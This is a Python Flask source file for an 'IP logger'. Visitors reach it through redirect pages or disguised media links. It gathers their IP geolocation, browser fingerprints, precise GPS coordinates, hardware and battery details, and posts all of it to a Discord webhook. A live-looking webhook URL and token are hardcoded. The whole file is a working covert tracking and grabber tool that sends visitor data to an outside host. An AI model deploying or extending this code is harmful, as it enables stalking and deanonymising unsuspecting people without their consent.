from flask import Flask, request, jsonify, render_template, redirect, url_for, make_response
import requests
import json
import time
import hashlib
import socket
import platform
from datetime import datetime
import os
import re
import threading
from user_agents import parse as parse_user_agent
from collections import defaultdict
import traceback

from config import Config

# ===================== INITIALIZATION =====================
app = Flask(__name__)
app.config.from_object(Config)

# Rate limiting storage
rate_limit_store = defaultdict(list)
rate_limit_lock = threading.Lock()




# ===================== UTILITY FUNCTIONS =====================
def log_to_console(message, level="INFO"):
    """Write logs to the server console."""
    if app.config.get("ENABLE_CONSOLE_LOGS", True):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}", flush=True)


def log(message, level="INFO"):
    """Log to the server console."""
    log_to_console(message, level)


def check_rate_limit(ip):
    """Check if IP has exceeded rate limit"""
    current_time = time.time()
    window = 60  # 1 minute window
    
    with rate_limit_lock:
        # Clean old entries
        rate_limit_store[ip] = [
            t for t in rate_limit_store[ip]
            if current_time - t < window
        ]
        
        if len(rate_limit_store[ip]) >= app.config["RATE_LIMIT"]:
            return False
        
        rate_limit_store[ip].append(current_time)
        return True


def get_client_ip():
    """Extract real client IP from various headers"""
    if request.headers.getlist("X-Forwarded-For"):
        return request.headers.getlist("X-Forwarded-For")[0].strip()
    
    forwarded_for = request.headers.get("X-Forwarded-For")
    if forwarded_for:
        return forwarded_for.split(",")[0].strip()
    
    x_real_ip = request.headers.get("X-Real-IP")
    if x_real_ip:
        return x_real_ip.strip()
    
    return request.remote_addr or "Unknown"


def parse_user_agent_string(ua_string):
    """Parse User-Agent string to extract detailed info"""
    try:
        ua = parse_user_agent(ua_string)
        return {
            "browser": ua.browser.family or "Unknown",
            "browser_version": ua.browser.version_string or "Unknown",
            "os": ua.os.family or "Unknown",
            "os_version": ua.os.version_string or "Unknown",
            "device_type": ua.device.family or "Unknown",
            "is_mobile": ua.is_mobile,
            "is_tablet": ua.is_tablet,
            "is_desktop": ua.is_pc,
            "is_bot": ua.is_bot,
        }
    except Exception as e:
        log(f"User-Agent parsing error: {e}", "ERROR")
        return {
            "browser": "Unknown",
            "browser_version": "Unknown",
            "os": "Unknown",
            "os_version": "Unknown",
            "device_type": "Unknown",
            "is_mobile": False,
            "is_tablet": False,
            "is_desktop": False,
            "is_bot": False,
        }


def get_ip_geolocation(ip):
    """Get geolocation data from IP address using multiple fallbacks"""
    try:
        # Method 1: ipapi.co (free, no key required for basic info)
        if app.config["IPAPI_KEY"]:
            url = f"https://ipapi.co/{ip}/json/?key={app.config['IPAPI_KEY']}"
        else:
            url = f"https://ipapi.co/{ip}/json/"
        
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "country": data.get("country_name", "Unknown"),
                "country_code": data.get("country_code", "Unknown"),
                "region": data.get("region", "Unknown"),
                "city": data.get("city", "Unknown"),
                "latitude": data.get("latitude"),
                "longitude": data.get("longitude"),
                "timezone": data.get("timezone", "Unknown"),
                "isp": data.get("org", data.get("asn", "Unknown")),
                "asn": data.get("asn", "Unknown"),
                "postal_code": data.get("postal", "Unknown"),
                "currency": data.get("currency", "Unknown"),
            }
    except Exception as e:
        log(f"ipapi.co lookup failed: {e}", "WARNING")
    
    try:
        # Method 2: ipwhois.io (fallback)
        response = requests.get(f"https://ipwhois.io/{ip}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "country": data.get("country", "Unknown"),
                "country_code": data.get("country_code", "Unknown"),
                "region": data.get("region", "Unknown"),
                "city": data.get("city", "Unknown"),
                "latitude": data.get("latitude"),
                "longitude": data.get("longitude"),
                "timezone": data.get("timezone", {}).get("id", "Unknown") if isinstance(data.get("timezone"), dict) else data.get("timezone", "Unknown"),
                "isp": data.get("isp", "Unknown"),
                "asn": data.get("connection", {}).get("asn", "Unknown") if isinstance(data.get("connection"), dict) else data.get("asn", "Unknown"),
                "postal_code": data.get("postal", "Unknown"),
                "currency": "Unknown",
            }
    except Exception as e:
        log(f"ipwhois.io lookup failed: {e}", "WARNING")
    
    # Last resort
    return {
        "country": "Unknown",
        "country_code": "Unknown",
        "region": "Unknown",
        "city": "Unknown",
        "latitude": None,
        "longitude": None,
        "timezone": "Unknown",
        "isp": "Unknown",
        "asn": "Unknown",
        "postal_code": "Unknown",
        "currency": "Unknown",
    }


def generate_session_id(ip, user_agent):
    """Generate a unique session identifier"""
    raw = f"{ip}:{user_agent}:{time.time()}"
    return hashlib.md5(raw.encode()).hexdigest()[:12]


def get_screen_info():
    """Get screen resolution and color depth info"""
    return {
        "width": None,
        "height": None,
        "color_depth": None,
        "pixel_ratio": None,
    }


def extract_referrer_info(referrer):
    """Extract information from the HTTP referrer"""
    if not referrer or referrer == "None":
        return {"source": "Direct", "url": "None", "domain": "None"}
    
    try:
        from urllib.parse import urlparse
        parsed = urlparse(referrer)
        domain = parsed.netloc or "Unknown"
        return {
            "source": domain,
            "url": referrer[:200],  # Truncate long URLs
            "domain": domain,
        }
    except Exception:
        return {
            "source": "Unknown",
            "url": referrer[:200],
            "domain": "Unknown",
        }


# ===================== DISCORD WEBHOOK FUNCTIONS =====================

def send_discord_embed(data):
    """Send collected data to Discord via webhook as an embed"""
    webhook_url = app.config["DISCORD_WEBHOOK_URL"]
    
    if webhook_url == "https://discord.com/api/webhooks/1559792963813507082/1wWyWztp1nzqM4TxcpgOPEhVrTpD_eQQRcFY5caPq84tHer51YqzmKqknoN2RaRzehXL":
        log("⚠️ Discord webhook URL not configured. Data logged locally only.", "WARNING")
        save_data_locally(data)
        return None
    
    try:
        # Prepare embed data
        ip = data["ip"]
        session_id = data["session_id"]
        ua_info = data["user_agent_info"]
        geo = data["geolocation"]
        browser_data = data["browser_data"]
        screen = data["screen_info"]
        location = data["location_data"]
        referrer_info = data["referrer_info"]
        timestamp = data["timestamp"]
        
        # Build location string
        location_str = f"{geo['city']}, {geo['region']}, {geo['country']}" if geo['city'] != 'Unknown' else f"{geo['country']}"
        
        # Device emoji selection
        device_emoji = "📱" if ua_info["is_mobile"] else ("🖥️" if ua_info["is_desktop"] else "📋")
        
        # Browser emoji selection
        browser_family = ua_info["browser"].lower()
        if "chrome" in browser_family:
            browser_emoji = "🌈"
        elif "firefox" in browser_family:
            browser_emoji = "🦊"
        elif "safari" in browser_family:
            browser_emoji = "🧭"
        elif "edge" in browser_family:
            browser_emoji = "🔵"
        elif "opera" in browser_family:
            browser_emoji = "🔴"
        else:
            browser_emoji = "🌐"
        
        # Bot detection
        bot_text = "🤖 BOT DETECTED" if ua_info["is_bot"] else "👤 Human"
        
        # Embed color (random-ish based on IP)
        color_hash = int(hashlib.md5(ip.encode()).hexdigest()[:6], 16)
        
        # Build description
        description = f"""
🔍 **IP Address:** `{ip}`
🆔 **Session ID:** `{session_id}`
🕐 **Timestamp:** {timestamp}

{device_emoji} **Device:** {ua_info['device_type']} • {ua_info['os']} {ua_info['os_version']}
{browser_emoji} **Browser:** {ua_info['browser']} {ua_info['browser_version']}
{bot_text}

📍 **Location:** {location_str}
🌐 **ISP:** {geo['isp']}
⏰ **Timezone:** {geo['timezone']}
📮 **Postal:** {geo['postal_code']}

🖥️ **Screen:** {screen['width']}x{screen['height']} • {screen['color_depth']}bit • DPR: {screen['pixel_ratio']}
"""
        
        # Add precise location if available
        if location.get("latitude") and location.get("longitude"):
            description += f"""
🎯 **Precise GPS:** {location['latitude']}, {location['longitude']} (Accuracy: {location.get('accuracy', 'N/A')}m)
🗺️ [View on Map](https://maps.google.com/?q={location['latitude']},{location['longitude']})
"""
        
        # Add referrer info
        if referrer_info["source"] != "Direct":
            description += f"""
🔗 **Referrer:** [{referrer_info['domain']}]({referrer_info['url']})
"""
        
        # Build fields
        fields = [
            {
                "name": "📊 Technical Details",
                "value": f"```asn: {geo['asn']}\ncurrency: {geo['currency']}\nlang: {data['languages']}\nprotocol: {data['protocol']}\nsecure: {data['is_secure']}\nrequest_id: {data['request_id']}```",
                "inline": True,
            },
            {
                "name": "🔧 Browser Features",
                "value": f"```webgl: {'Yes' if browser_data.get('webgl') else 'No'}\ncanvas: {'Yes' if browser_data.get('canvas') else 'No'}\nweb_audio: {'Yes' if browser_data.get('web_audio') else 'No'}\nnotifications: {browser_data.get('notifications', 'Unknown')}\nwebgl_vendor: {browser_data.get('webgl_vendor', 'N/A')[:50]}```",
                "inline": True,
            },
            {
                "name": "💻 Hardware & System",
                "value": f"```cores: {browser_data.get('cores', 'N/A')}\nram: {browser_data.get('ram', 'N/A')}\nplatform: {browser_data.get('platform', 'N/A')}\narch: {browser_data.get('architecture', 'N/A')}\nmodel: {browser_data.get('model', 'N/A')}```",
                "inline": True,
            },
            {
                "name": "📡 Network Info",
                "value": f"```connection: {browser_data.get('connection_type', 'Unknown')}\ndownlink: {browser_data.get('downlink', 'Unknown')} Mbps\nrtt: {browser_data.get('rtt', 'Unknown')} ms\nonline: {browser_data.get('online', 'Unknown')}```",
                "inline": True,
            },
        ]
        
        # Add battery info if available
        if browser_data.get("battery_level") is not None:
            fields.append({
                "name": "🔋 Battery Status",
                "value": f"```level: {int(browser_data['battery_level'] * 100)}%\ncharging: {browser_data.get('charging', False)}```",
                "inline": True,
            })
        
        # Build embed payload
        payload = {
            "username": "IP Logger Bot 🕵️",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/5317/5317321.png",
            "embeds": [{
                "title": f"{device_emoji} New Visitor Logged",
                "description": description,
                "color": color_hash,
                "fields": fields,
                "footer": {
                    "text": f"IP Logger System • {len(rate_limit_store)} active IPs tracked",
                    "icon_url": "https://cdn-icons-png.flaticon.com/512/869/869869.png",
                },
                "timestamp": timestamp,
            }]
        }
        
        # Send to Discord
        response = requests.post(webhook_url, json=payload, timeout=10)
        
        if response.status_code in (200, 204):
            log(f"✅ Data sent to Discord for IP {ip}")
            save_data_locally(data)
            return {"status": "success", "id": session_id}
        else:
            log(f"❌ Discord webhook failed: {response.status_code} - {response.text}", "ERROR")
            save_data_locally(data)
            return {"status": "webhook_error", "code": response.status_code}
    
    except Exception as e:
        log(f"❌ Error sending to Discord: {e}", "ERROR")
        traceback.print_exc()
        save_data_locally(data)
        return {"status": "error", "message": str(e)}


def save_data_locally(data):
    """Save logged data to a local JSON file"""
    try:
        log_file = "logs/collected_data.jsonl"
        with open(log_file, "a") as f:
            f.write(json.dumps(data) + "\n")
    except Exception as e:
        log(f"Error saving data locally: {e}", "ERROR")


# ===================== ROUTES =====================

@app.route("/")
def index():
    """Main logging route - renders the redirect page"""
    # Rate limiting check
    client_ip = get_client_ip()
    
    if not check_rate_limit(client_ip):
        log(f"🚫 Rate limit exceeded for IP: {client_ip}", "WARNING")
        response = make_response("Rate limit exceeded. Please try again later.", 429)
        response.headers["Retry-After"] = "60"
        return response
    
    # Log initial visit
    log(f"🔔 New visit from IP: {client_ip}")
    
    return render_template("redirect.html", redirect_url=app.config["REDIRECT_URL"])


@app.route("/api/log", methods=["POST"])
def log_data():
    """API endpoint to receive and process logged data"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        # Extract client information
        client_ip = get_client_ip()
        user_agent_string = request.headers.get("User-Agent", "")
        referrer = request.headers.get("Referer", "")
        
        # Parse all the data
        ua_info = parse_user_agent_string(user_agent_string)
        geo = get_ip_geolocation(client_ip)
        referrer_info = extract_referrer_info(referrer)
        session_id = generate_session_id(client_ip, user_agent_string)
        timestamp = datetime.utcnow().isoformat() + "Z"
        request_id = hashlib.sha256(f"{client_ip}:{time.time()}".encode()).hexdigest()[:16]
        
        # Compile complete data object
        complete_data = {
            "ip": client_ip,
            "session_id": session_id,
            "request_id": request_id,
            "timestamp": timestamp,
            "user_agent": user_agent_string,
            "user_agent_info": ua_info,
            "geolocation": geo,
            "referrer_info": referrer_info,
            "protocol": "HTTPS" if request.is_secure else "HTTP",
            "is_secure": request.is_secure,
            "languages": request.accept_languages.to_header(),
            "screen_info": data.get("screen", get_screen_info()),
            "browser_data": data.get("browser", {}),
            "location_data": data.get("location", {}),
            "canvas_fingerprint": data.get("canvas_fingerprint"),
            "webgl_fingerprint": data.get("webgl_fingerprint"),
            "audio_fingerprint": data.get("audio_fingerprint"),
            "media_devices": data.get("media_devices", []),
            "battery_info": data.get("battery"),
            "connection_info": data.get("connection"),
            "timezone": data.get("timezone"),
            "platform_info": data.get("platform"),
            "permissions": data.get("permissions", {}),
        }
        
        log(f"📥 Received data from IP: {client_ip} | Browser: {ua_info['browser']} | Device: {ua_info['device_type']}")
        
        # Send to Discord
        result = send_discord_embed(complete_data)
        
        return jsonify(result or {"status": "success", "id": session_id})
    
    except Exception as e:
        log(f"❌ Error processing log data: {e}", "ERROR")
        traceback.print_exc()
        return jsonify({"status": "error", "message": "Internal server error"}), 500


@app.route("/api/media/<identifier>")
def get_media(identifier):
    """Serve custom media based on identifier (e.g., gif.1113, gif.1114)"""
    # Extract numeric ID from identifier like "gif.1113.mp4"
    match = re.search(r'(\d{4})', identifier)
    
    if not match:
        return jsonify({"error": "Invalid media identifier"}), 400
    
    media_id = match.group(1)
    media_url = app.config["MEDIA_LINKS"].get(media_id)
    
    if not media_url:
        return jsonify({"error": "Media not found"}), 404
    
    # Log media access
    client_ip = get_client_ip()
    log(f"🎬 Media accessed: {identifier} by IP: {client_ip}")
    
    # Redirect to the actual media URL
    return redirect(media_url)


@app.route("/api/health")
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "version": "1.0.0",
        "webhook_configured": app.config["DISCORD_WEBHOOK_URL"] != "YOUR_WEBHOOK_URL_HERE",
    })


@app.route("/api/stats")
def stats():
    """Get basic statistics"""
    return jsonify({
        "tracked_ips": len(rate_limit_store),
        "webhook_configured": app.config["DISCORD_WEBHOOK_URL"] != "YOUR_WEBHOOK_URL_HERE",
        "rate_limit": app.config["RATE_LIMIT"],
        "active_media_links": len(app.config["MEDIA_LINKS"]),
    })


@app.errorhandler(404)
def not_found(e):
    """Handle 404 errors"""
    return jsonify({"error": "Not found"}), 404


@app.errorhandler(500)
def internal_error(e):
    """Handle 500 errors"""
    log(f"Internal server error: {e}", "ERROR")
    return jsonify({"error": "Internal server error"}), 500


# ===================== RUN SERVER =====================

if __name__ == "__main__":
    print("=" * 60)
    print("🕵️  IP Logger System v1.0")
    print("=" * 60)
    print(f"📡 Server starting on http://{Config.HOST}:{Config.PORT}")
    print(f"📍 Redirect URL: {Config.REDIRECT_URL}")
    print(f"🔗 Discord Webhook: {'✅ Configured' if Config.DISCORD_WEBHOOK_URL != 'YOUR_WEBHOOK_URL_HERE' else '❌ Not configured'}")
    print(f"🎬 Media links configured: {len(Config.MEDIA_LINKS)}")
    print(f"🛡️ Rate limit: {Config.RATE_LIMIT} requests/min/IP")
    print("=" * 60)
    print("⚠️  REMINDER: Use responsibly and comply with privacy laws.")
    print("=" * 60)
    
    app.run(host=Config.HOST, port=Config.PORT, debug=Config.DEBUG)
